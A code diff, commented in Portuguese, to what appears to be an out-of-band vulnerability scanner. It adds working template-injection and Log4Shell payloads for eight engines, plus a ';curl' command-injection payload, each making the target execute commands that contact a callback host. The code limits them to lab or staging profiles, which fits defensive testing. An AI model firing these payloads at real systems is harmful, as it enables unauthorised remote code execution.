@@ -145,10 +145,42 @@ class OOBSession:
             pass
 
 
+def _ssti_payloads(host):
+    """Payloads SSTI para múltiplas engines de template. TODOS resolvem `host`
+    (via DNS lookup ou fetch HTTP) → callback OOB, sem importar qual engine
+    processou. Cobertura: Log4j, Jinja2, Twig, ERB, Velocity, Smarty, Spring
+    SpEL, FreeMarker.
+
+    Os payloads são intencionalmente curtos para caber em parâmetros pequenos
+    e usam só caracteres ASCII para evitar problemas de encoding.
+    """
+    # Log4Shell / JNDI lookup (Java/log4j ≤ 2.16)
+    yield "${jndi:ldap://%s/x}" % host
+    # Jinja2 / Flask — popen('nslookup host')
+    yield ("{{''.__class__.__base__.__subclasses__()[0].__init__.__globals__"
+           "['os'].popen('nslookup %s').read()}}") % host
+    # Twig (Symfony) — registra exec e chama com nslookup
+    yield ('{{_self.env.registerUndefinedFilterCallback("exec")}}'
+           '{{_self.env.getFilter("nslookup %s")}}') % host
+    # ERB (Rails) — backticks
+    yield "<%%= `nslookup %s` %%>" % host
+    # Velocity (Apache/Java) — Runtime.exec
+    yield "#set($e=$rt.getRuntime().exec(['nslookup','%s']))" % host
+    # Smarty (PHP) — system()
+    yield "{system('nslookup %s')}" % host
+    # Spring SpEL — T(Runtime).getRuntime().exec
+    yield ('${T(java.lang.Runtime).getRuntime().exec(new String[]{"nslookup","%s"})}'
+           ) % host
+    # FreeMarker — Execute().eval()
+    yield ('<#assign x="freemarker.template.utility.Execute"?new()>'
+           '${x("nslookup %s")}') % host
+
+
 def inject_oob_url(matched_url, oob_url, vuln_type, profile="lab"):
     """
-    Devolve um comando curl que injeta oob_url no ponto provável de SSRF/RCE/SSTI.
-    Retorna None quando o tipo não se aplica ou o perfil não autoriza.
+    Devolve uma LISTA de comandos curl que injetam `oob_url` no ponto provável
+    de SSRF/RCE/SSTI. Lista vazia quando o tipo não se aplica ou o perfil não
+    autoriza. Para SSTI, retorna múltiplos payloads (um por engine de template).
 
     - ssrf: injeta a URL OOB em parâmetros candidatos (não intrusivo).
     - rce/ssti: payloads intrusivos — só lab/staging, nunca production.
@@ -164,21 +196,28 @@ def inject_oob_url(matched_url, oob_url, vuln_type, profile="lab"):
         else:
             sep = "&" if "?" in matched_url else "?"
             target = f"{matched_url}{sep}url={oob_url}"
-        return f"curl -sk -L --max-time 12 {shlex.quote(target)}"
+        return [f"curl -sk -L --max-time 12 {shlex.quote(target)}"]
 
-    if vuln_type in ("rce", "ssti"):
-        if profile == "production":
-            return None  # intrusivo — proibido em produção
-        host = urlparse(oob_url).hostname or ""
-        if not host:
-            return None
-        if vuln_type == "rce":
-            # Command injection cego: faz o alvo resolver/baixar a URL OOB.
-            payload = f";curl {shlex.quote(oob_url)};"
-        else:  # ssti / log4j-style
-            payload = "${jndi:ldap://%s/x}" % host
-        sep = "&" if "?" in matched_url else "?"
+    if vuln_type not in ("rce", "ssti"):
+        return []
+    if profile == "production":
+        return []  # intrusivo — proibido em produção
+    host = urlparse(oob_url).hostname or ""
+    if not host:
+        return []
+
+    sep = "&" if "?" in matched_url else "?"
+
+    if vuln_type == "rce":
+        # Command injection cego: faz o alvo resolver/baixar a URL OOB.
+        payload = f";curl {shlex.quote(oob_url)};"
+        target  = f"{matched_url}{sep}q={payload}"
+        return [f"curl -sk -L --max-time 12 {shlex.quote(target)}"]
+
+    # ssti — cobre múltiplas engines (Log4j, Jinja2, Twig, ERB, Velocity,
+    # Smarty, SpEL, FreeMarker). Cada engine ignora o que não entende.
+    cmds = []
+    for payload in _ssti_payloads(host):
         target = f"{matched_url}{sep}q={payload}"
-        return f"curl -sk -L --max-time 12 {shlex.quote(target)}"
-
-    return None
+        cmds.append(f"curl -sk -L --max-time 12 {shlex.quote(target)}")
+    return cmds
